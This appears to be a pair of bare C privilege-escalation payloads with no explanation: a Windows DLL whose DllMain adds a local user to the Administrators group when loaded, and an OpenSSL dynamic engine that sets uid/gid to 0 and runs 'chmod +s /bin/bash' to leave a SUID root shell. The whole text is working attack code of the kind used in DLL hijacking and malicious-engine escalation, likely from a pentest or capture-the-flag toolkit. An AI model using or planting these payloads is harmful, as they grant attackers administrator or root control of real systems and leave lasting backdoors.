#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user <USER> <PASS> /add");
        system("net localgroup Administrators <USER> /add");
    }
    return TRUE;
}

#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "priv";
static const char *engine_name = "priv";

static int bind(ENGINE *e, const char *id) {
  int ret = 0;
  if (!ENGINE_set_id(e, engine_id)) goto end;
  if (!ENGINE_set_name(e, engine_name)) goto end;
  setuid(0);
  setgid(0);
  system("chmod +s /bin/bash");
  ret = 1;
end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

